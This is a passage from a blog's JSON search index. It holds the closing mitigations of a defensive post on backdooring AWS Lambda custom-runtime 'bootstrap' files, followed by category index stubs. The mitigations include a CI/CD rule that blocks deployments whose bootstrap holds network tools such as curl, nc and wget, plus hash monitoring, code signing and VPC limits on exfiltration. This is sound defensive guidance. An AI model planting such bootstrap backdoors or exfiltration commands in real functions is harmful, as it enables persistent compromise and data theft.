Cloud, Aqua Security, or Lacework. These tools can detect command injections, runtime file modifications (<code>bootstrap</code>), or anomalous processes within the Lambda environment.</li> </ul> </li> <li> <p><code>bootstrap</code> Content Review:</p> <ul> <li>Manual and Automated Auditing: For functions with custom runtimes, the <code>bootstrap</code> file must be rigorously audited. Integrate validations in your CI/CD pipelines that block deployments with suspicious commands (e.g., <code>curl</code>, <code>nc</code>, <code>wget</code>) or unauthorized changes in the <code>bootstrap</code>.</li> <li>Hash Monitoring: Use <code>aws lambda get-function --query 'Configuration.CodeSha256'</code> to get the ZIP code hash. Store and monitor these hashes to detect any unexpected changes in the function's deployment package.</li> </ul> </li> <li> <p>Supply Chain Security:</p> <ul> <li>Code Signing: AWS Lambda supports code signing. Enable this feature to ensure that only code packages signed by trusted entities can be deployed to your functions. This would thwart any attempt to deploy a modified <code>bootstrap</code> without the proper signature.</li> <li>Container Image Scanning: If you use container images as a runtime for Lambda, integrate Amazon Inspector or third-party tools into your pipeline to continuously scan images for vulnerabilities and malicious content, including <code>bootstrap</code> modifications.</li> </ul> </li> <li> <p>Least Privilege and Isolation Principles:</p> <ul> <li>IAM Least Privilege: Ensure that Lambda deployment IAM roles (<code>lambda:UpdateFunctionCode</code>) and execution roles (<code>lambda:InvokeFunction</code>) have only the strictly necessary permissions. Avoid granting excessive permissions that could be exploited.</li> <li>Network Restrictions (VPC): Place critical Lambda functions within an Amazon VPC. If a function does not require internet access, avoid configuring a NAT Gateway. This drastically restricts an attacker's ability to exfiltrate data to external webhooks.</li> </ul> </li> </ol> <p>The world of serverless security is always evolving, and as defenders, so must we. Understanding how seemingly benign components like the <code>bootstrap</code> can be weaponized is key to staying ahead. Keep your eyes peeled, your CloudTrails flowing, and your security tools sharp. The cloud might feel like magic, but even magic has its dark corners \u2013 it's up to us to shine a light on them.</p>","tags":["backdoor","persistence","lambda","bootstrap","runtime","webhook"]},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/category/lambda/","title":"Lambda","text":""},{"location":"blog/category/persistence/","title":"Persistence","text":""},{"location":"blog/category/iam/","title":"IAM","text":""},{"location":"blog/category/s3/","title":"S3","text":""},{"location":"blog/category/ransomware/","title":"Ransomware","text":""}]}